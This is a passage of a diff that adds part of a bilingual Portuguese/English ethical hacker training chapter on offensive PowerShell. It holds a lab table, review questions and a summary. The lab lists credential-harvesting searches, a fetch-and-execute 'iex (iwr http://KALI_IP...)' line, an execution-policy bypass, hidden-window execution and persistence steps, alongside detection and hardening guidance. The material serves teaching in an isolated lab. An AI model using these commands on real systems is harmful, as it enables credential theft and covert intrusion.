+    <li><strong>Monitorizar <code class="inline">schtasks</code></strong> (Event ID 4698) e tarefas com nome legítimo mas binário em <code class="inline">C:\Windows\Temp</code>. / monitor <code class="inline">schtasks</code> and legit-named tasks with binaries in Temp.</li>
+    <li><strong>Monitorizar limpeza de logs</strong> (Event ID 1102, 104) e <code class="inline">wevtutil cl</code>. / monitor log clearing.</li>
+    <li><strong>Proteger <code class="inline">ConsoleHost_history.txt</code></strong> com ACLs e centralizar logs. / protect with ACLs and centralize logs.</li>
+    <li><strong>Egress filtering</strong> — bloqueia Pastebin, GitHub raw, IPs de C2. / blocks Pastebin, GitHub raw, C2 IPs.</li>
+    <li><strong>Desativar autologon</strong> e limpar <code class="inline">DefaultPassword</code> do Winlogon. / disable autologon and clear <code class="inline">DefaultPassword</code>.</li>
+  </ol>
+</section>
+
+<!-- ===================== LAB ===================== -->
+<section id="lab">
+  <h2>21. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar / Complementary</span></h2>
+  <div class="lang">
+    <span class="pt"><strong>Cenário:</strong> VM Windows 10/11 isolada (host-only), com um utilizador local e alguns ficheiros de teste (um <code class="inline">.txt</code> com a string "password"). Snapshot antes de começar. Kali na mesma rede host-only para o passo 4.</span>
+    <span class="en"><strong>Scenario:</strong> Isolated Windows 10/11 VM (host-only), with a local user and some test files (a <code class="inline">.txt</code> containing "password"). Snapshot before starting. Kali on the same host-only network for step 4.</span>
+  </div>
+  <table>
+    <tr><th>#</th><th>Tarefa / Task</th><th>Comando / Command</th><th>Evidência / Evidence</th></tr>
+    <tr><td>1</td><td>Testar comandos core / Test core commands</td><td><code class="inline">ls</code>, <code class="inline">cat</code>, <code class="inline">ps</code>, <code class="inline">tree /F</code></td><td>Output</td></tr>
+    <tr><td>2</td><td>Credential harvesting com findstr / with findstr</td><td><code class="inline">findstr /SIM /C:"password" *.txt</code></td><td>Ficheiro encontrado / File found</td></tr>
+    <tr><td>3</td><td>Credential harvesting no registo / in registry</td><td><code class="inline">reg query HKCU /f password /t REG_SZ /s</code></td><td>Output</td></tr>
+    <tr><td>4</td><td>Fileless execution com Kali / with Kali</td><td>Kali: <code class="inline">python3 -m http.server 8000</code>; Windows: <code class="inline">iex (iwr http://KALI_IP:8000/test.ps1)</code></td><td>PCAP (Wireshark) + output</td></tr>
+    <tr><td>5</td><td>Bypass execution policy / Bypass</td><td><code class="inline">powershell -ep bypass -File .\hello.ps1</code></td><td>Output</td></tr>
+    <tr><td>6</td><td>Base64 encode/decode</td><td><code class="inline">[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "X"'))</code></td><td>String Base64</td></tr>
+    <tr><td>7</td><td>Persistência via profile (simulação) / Profile persistence (simulated)</td><td><code class="inline">Add-Content -Path $Profile -Value "Write-Output 'persist'"</code></td><td>Conteúdo do <code class="inline">$Profile</code></td></tr>
+    <tr><td>8</td><td>Execução furtiva / Stealth execution</td><td><code class="inline">Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -Command Write-Output 'hidden'"</code></td><td>Sem janela visível / No visible window</td></tr>
+    <tr><td>9</td><td>Scheduled task de teste / Test scheduled task</td><td><code class="inline">schtasks /create /tn "TestTask" /tr "notepad.exe" /sc once /st 23:59 /ru System</code></td><td><code class="inline">schtasks /query /tn "TestTask"</code></td></tr>
+    <tr><td>10</td><td>(Defensivo) Ver eventos 4104 / (Defensive) view 4104</td><td><code class="inline">Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 20 | Where-Object Id -eq 4104</code></td><td>Eventos capturados / Captured events</td></tr>
+    <tr><td>11</td><td>(Defensivo) Verificar NLA / (Defensive) check NLA</td><td><code class="inline">Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication</code></td><td>Valor = 1 / Value = 1</td></tr>
+  </table>
+  <div class="callout danger">
+    <strong>⚠️ Limpeza / Cleanup:</strong>
+    <div class="lang">
+      <span class="pt">Reverter snapshots no fim. Se alteraste o registo, remove as chaves: <code class="inline">reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f</code> e <code class="inline">schtasks /delete /tn "TestTask" /f</code>.</span>
+      <span class="en">Revert snapshots at the end. If you changed the registry, remove the keys: <code class="inline">reg delete ... /f</code> and <code class="inline">schtasks /delete /tn "TestTask" /f</code>.</span>
+    </div>
+  </div>
+  <h3>Checklist de evidências / Evidence checklist</h3>
+  <ul class="checklist">
+    <li>Snapshot inicial / Initial snapshot</li>
+    <li>Output dos comandos core / Core commands output</li>
+    <li>findstr + reg query outputs</li>
+    <li>PCAP do passo 4 / Step 4 PCAP</li>
+    <li>String Base64 e output / Base64 string and output</li>
+    <li>Conteúdo do <code class="inline">$Profile</code> / <code class="inline">$Profile</code> content</li>
+    <li>Evento 4104 capturado / Event 4104 captured</li>
+    <li>Snapshot final / Final snapshot</li>
+  </ul>
+</section>
+
+<!-- ===================== REVISÃO ===================== -->
+<section id="revq">
+  <h2>22. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar / Complementary</span></h2>
+  <ol>
+    <li>Porque é que <code class="inline">findstr /SIM /C:"password"</code> é preferível a ferramentas externas? / Why is it preferable to external tools?</li>
+    <li>Que três chaves de registo são mais úteis para credenciais e porquê? / Which three registry keys are most useful for credentials and why?</li>
+    <li>Como funciona o SMB Hash Leak e que ferramenta o captura? / How does SMB Hash Leak work and which tool captures it?</li>
+    <li>Qual a diferença entre <code class="inline">-ep bypass</code> e <code class="inline">Set-ExecutionPolicy</code>? / What's the difference?</li>
+    <li>Porque é que <code class="inline">iex (iwr ...)</code> é fileless? / Why is it fileless?</li>
+    <li>O que faz <code class="inline">-WindowStyle Hidden</code> e <code class="inline">-NoProfile</code>? / What do they do?</li>
+    <li>Como se limpa o histórico do PSReadLine sem apagar o ficheiro? / How to clear PSReadLine history without deleting the file?</li>
+    <li>Como se deteta uma scheduled task maliciosa? / How to detect a malicious scheduled task?</li>
+    <li>O que é o backdoor Utilman e como se mitiga? / What is the Utilman backdoor and how to mitigate?</li>
+  </ol>
+</section>
+
+<!-- ===================== RESUMO ===================== -->
+<section id="sum">
+  <h2>23. Resumo do Capítulo / Chapter Summary</h2>
+  <div class="lang">
+    <span class="pt">Este capítulo cobriu o essencial ofensivo do PowerShell: comandos core e wildcards, credential harvesting nativo (findstr, registo, Inveigh), bypass de execution policy, download e execução fileless, downgrade attacks, deteção/desativação de AV, Base64, reverse shells, persistência via profile e scheduled tasks, execução furtiva, gestão de histórico, listagem de processos, gestão de sessões, limpeza de logs e o backdoor Utilman. O Cap. 2 (LDAP Filters) entra no reconhecimento de Active Directory.</span>
+    <span class="en">This chapter covered PowerShell's offensive essentials: core commands and wildcards, native credential harvesting (findstr, registry, Inveigh), execution policy bypass, download and fileless execution, downgrade attacks, AV detection/disablement, Base64, reverse shells, profile and scheduled-task persistence, stealth execution, history management, process listing, session management, log clearing, and the Utilman backdoor. Ch. 2 (LDAP Filters) moves into Active Directory reconnaissance.</span>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div>Manual de Formação Ethical Hacker — Cap. 1 / Ethical Hacker Training Manual — Ch. 1</div>
+  <div style="margin-top:.6rem">
+    <a href="cap00.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+    <a href="#">Índice / Index</a> &nbsp;|&nbsp;
+    <a href="cap02.html">Cap. seguinte / Next →</a>
+  </div>
+</footer>
+
+</body>
+</html>
